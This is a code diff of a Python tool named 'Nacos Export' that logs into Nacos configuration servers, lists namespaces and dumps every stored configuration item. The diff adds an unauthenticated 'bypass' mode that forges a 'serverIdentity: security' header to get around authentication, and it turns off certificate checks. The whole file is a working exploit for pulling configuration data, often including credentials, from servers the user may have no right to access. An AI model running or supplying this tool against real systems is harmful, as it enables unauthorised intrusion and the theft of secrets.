@@ -1,125 +1,120 @@
 import requests
 import sys
+import urllib3
+urllib3.disable_warnings()
 
 
-proxy = {
+PROXY = {
     # "http": "127.0.0.1:8080"
 }
 
-def get_auth_token(target: str, username: str, password: str) -> str:
-    token = ""
-    path = "/v1/auth/users/login"
-    url = target + path
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
-    }
-    data = {
-        'username': username,
-        'password': password,
-    }
-    try:
-        resp = requests.post(url, headers=headers, data=data, proxies=proxy)
-        resp_dict = resp.json()
-        token = resp_dict.get("accessToken")
-    except Exception:
-        pass
-    
-    
-    return token
+HEADER = {
+    'Accept': 'application/json, text/plain, */*',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
+}
 
-def get_auth_token_no_users(target: str, username: str, password: str) -> str:
-    token = ""
-    path = "/v1/auth/login"
-    url = target + path
-    headers = {
-        'Accept': 'application/json',
-        # X-Requested-With: XMLHttpRequest
-        # Authorization: null
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
-    }
-    data = {
+def login(target: str, username: str, password: str) -> str:
+    token = None
+    login_1 = "/v1/auth/users/login"
+    login_2 = "/v1/auth/login"
+
+    login_params = {
         'username': username,
         'password': password,
         'namespaceId': ''
     }
+
     try:
-        resp = requests.post(url, headers=headers, data=data, proxies=proxy)
-        token = resp.headers.get("Authorization")
+        resp = requests.post(target + login_1, headers=HEADER, data=login_params, proxies=PROXY, verify=False)
+        resp_json = resp.json()
+        token = resp_json.get("accessToken")
+        if token == None:
+            resp = requests.post(target + login_2, headers=HEADER, data=login_params, proxies=PROXY, verify=False)
+            token = resp.headers.get("Authorization")
     except Exception:
         pass
-    return token
+    if token == None:
+        print("[!] login failed.")
+        exit(0)
+    else:
+        print("[+] Tokne: {}".format(token))
+        return token
 
-
-def get_namespaces(target: str, token: str, bypass: bool) -> list:
-    namespace_id = []
+def get_namespaces(target: str, token: str) -> list:
     path = "/v1/console/namespaces"
     url = target + path
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Authorization': token,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
-    }
-    if bypass:
-        headers['serverIdentity'] = "security"
+    if token != "":
+        HEADER["Authorization"] = token
     params = {
         'namespaceId': '',
     }
-    resp = requests.get(url, headers=headers, params=params, proxies=proxy)
-    resp_dict = resp.json()
-    namespace_id = [item['namespace'] for item in resp_dict['data']]
-    return namespace_id
+    resp = requests.get(url, headers=HEADER, params=params, proxies=PROXY, verify=False)
+    if resp.status_code == 200:
+        resp_dict = resp.json()
+        return resp_dict['data']
 
+def print_output(namespace: str, group:str, dataId: str, content: str):
+    print("""
 
-def dump_config_content(target: str, namespaces: list, token: str, bypass: bool, count: int = 100):
-    content_list = list()
-    path = '/v1/cs/configs'
-    url = target + path
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accesstoken': token,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
-    }
-    if bypass:
-        headers['serverIdentity'] = "security"
+##################################################
+[+] Namespace: {namespace}
+[+] Group: {group}
+[+] DataId: {dataid}
+##################################################
+""".format(namespace=namespace, group=group, dataid=dataId ))
+    print(content, "\n")
+
+def dump_config_content(target: str, token: str):
+    namespaces = get_namespaces(target, token)
+    count = 0
+    path = "/v1/cs/configs"
     for namespace in namespaces:
         params = {
-            'dataId': '',
-            'group': '',
-            'appName': '',
-            'config_tags': '',
-            'pageNo': 1,
-            'pageSize': count,
-            'tenant': namespace,
-            'search': 'accurate',
-            'accessToken': token,
+            "search": "accurate",
+            "dataId": "",
+            "group": "",
+            "appName": "",
+            "config_tags": "",
+            "pageNo": 1,
+            "pageSize": namespace["configCount"],
+            "tenant": namespace["namespace"],
+            "namespaceId": ""
         }
-        resp = requests.get(url, headers=headers, params=params, proxies=proxy)
-        resp_dict = resp.json()
-        for item in resp_dict['pageItems']:
-            print("""
-##################################################
-[+] NAMESPACE: {namespace}
-[+] CONFIG: {dataid}
-##################################################
-
-""".format(dataid=item["dataId"], namespace=item["group"]))
-            print(item['content'])
-            content_list.append(item['content'])
-    return content_list
-
-# def parser_config(content):
-    # # TODO
-    # for c in content:
-    #     pass
+        # bypass
+        if token == "":
+            resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
+            if resp.status_code == 200:
+                resp_json = resp.json()
+                for item in resp_json['pageItems']:
+                    print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
+                    count = count + 1
+            else:
+                HEADER['serverIdentity'] = "security"
+                resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
+                if resp.status_code == 200:
+                    resp_json = resp.json()
+                    for item in resp_json['pageItems']:
+                        print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
+                        count = count + 1
+        else:
+            HEADER["Accesstoken"] = token
+            params["accessToken"] = token
+            resp = requests.get(target + path, headers=HEADER, params=params, proxies=PROXY, verify=False)
+            if resp.status_code == 200:
+                resp_json = resp.json()
+                for item in resp_json["pageItems"]:
+                    print_output(namespace["namespace"], item["group"], item["dataId"], item["content"])
+                    count = count + 1
+    
+    print("[+] Count: ", count)
 
 def usage(name: str):
+    ver = "v1.0.0"
     print("""
  ______________
 < Nacos Export >         @Author: Arm!tage
- --------------
+ --------------          @Version: {version}
         \   ^__^
          \  (oo)\_______
             (__)\       )\/\\
@@ -129,43 +124,35 @@ def usage(name: str):
 Usage:
     python3 {script} <URL> <USERNAME> <PASSWORD>
     python3 {script} <URL> <TOKEN>
-    python3 {script} <URL> nacos-auth-bypass
+    python3 {script} <URL> bypass|unauth
 
 Example:
     python3 {script} http://localhost:8848/nacos nacos nacos
-    python3 {script} http://localhost:8848/nacos 2XnOEwXXXXXXXXXXXXXXXXtboYW
-    """.format(script=name))
+    python3 {script} http://localhost:8848/nacos eyJhbGciOiJIXXXXXXXXXXXX
+    python3 {script} http://localhost:8848/nacos unauth
+    """.format(script=name, version=ver))
 
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
         usage(sys.argv[0])
-        exit()
+        exit(0)
 
     target = sys.argv[1].rstrip('/')
     print("[+] Target: ", target)
     token = ""
-    bypass = False
     if len(sys.argv) == 4:
         print("[+] Username: ", sys.argv[2])
         print("[+] Password: ", sys.argv[3])
         print("\n")
-        token = get_auth_token(target, sys.argv[2], sys.argv[3])
-        if token == None:
-            token = get_auth_token_no_users(target, sys.argv[2], sys.argv[3])
-    if len(sys.argv) == 3:
-        if sys.argv[2] != "nacos-auth-bypass":
+        token = login(target, sys.argv[2], sys.argv[3])
+        dump_config_content(target, token)
+    elif len(sys.argv) == 3:
+        if sys.argv[2] == "bypass" or sys.argv[2] == "unauth":
+            print("[*] Bypass/Unauth")
+            dump_config_content(target, "")
+        else:
             print("[+] Token: ", sys.argv[2])
             print("\n")
             token = sys.argv[2]
-        else:
-            # header = { "serverIdentity": "security"}
-            print("[+] Bypass")
-            print("\n")
-            bypass = True
-
-
-
-    namespaces = get_namespaces(target, token, bypass)
-    dump_config_content(target, namespaces, token, bypass)
-    # parser_config(dump_config_content(target, namespaces, token, bypass))
+            dump_config_content(target, token)
